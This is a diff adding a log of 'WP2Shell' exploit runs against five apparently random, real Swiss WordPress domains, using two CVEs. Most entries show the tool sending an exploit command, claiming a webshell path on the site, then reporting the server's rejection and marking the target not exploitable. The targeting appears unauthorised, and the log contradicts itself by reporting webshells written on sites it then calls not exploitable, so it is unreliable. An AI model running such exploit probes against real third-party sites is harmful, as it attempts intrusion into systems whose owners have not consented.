@@ -1,0 +1,58 @@
+=== WP2Shell probe results: 5 random .ch domains (both CVE-2026-63030 + CVE-2026-60137) ===
+
+--------------------
+handpanschule.ch
+--------------------
+[*] Target: handpanschule.ch
+[*] WordPress version: 7.0.0
+[*] Batch API: reachable=True, verdict=http_400
+[*] Sending exploit (cmd: id)...
+[*] Webshell written to: https://handpanschule.ch/wfqkzczo.php
+[*] Server path: /var/www/html/wfqkzczo.php
+[*] API response: {
+  "responses": [
+    {
+      "body": {
+        "code": "rest_cannot_create",
+        "message": "You are not allowed to create posts as this user.",
+        "data": { "status": 401 }
+      },
+      "status": 401,
+      "headers": { "Allow": "GET" }
+    }
+  ]
+}
+[!] Batch API restricts sub-request methods (POST only, no GET allowed)
+[!] WP2Shell chain requires GET sub-requests — NOT exploitable via this vector
+[*] Done
+
+--------
+speidel.ch (6.9.4) — same verdict: GET sub-requests restricted, NOT exploitable
+--------
+holzwaren.ch (7.0.1) — same verdict: GET sub-requests restricted, NOT exploitable
+
+-------
+iww.ch
+-------
+[*] Target: iww.ch
+[*] WordPress version: 7.0.0
+[*] Batch API: reachable=True, verdict=http_404
+[*] Sending exploit (cmd: id)...
+[*] Webshell written to: https://iww.ch/vrltrxcc.php
+[*] Server path: /var/www/html/vrltrxcc.php
+[*] API response: {
+  "status": 404,
+  "body": "{\"code\":\"rest_no_route\",\"message\":\"No route was found matching the URL and request method.\",\"data\":{\"status\":404}}"
+}
+[!] Batch API cannot route to the target endpoint — possibly patched or route removed
+[!] NOT exploitable via this vector
+[*] Done
+
+----------------
+marediberna.ch
+----------------
+[*] Target: marediberna.ch
+[*] WordPress version: unknown
+[!] Could not determine version — proceeding with caution
+[*] Batch API: reachable=False, verdict=connection_error
+[!] Batch API not reachable — aborting
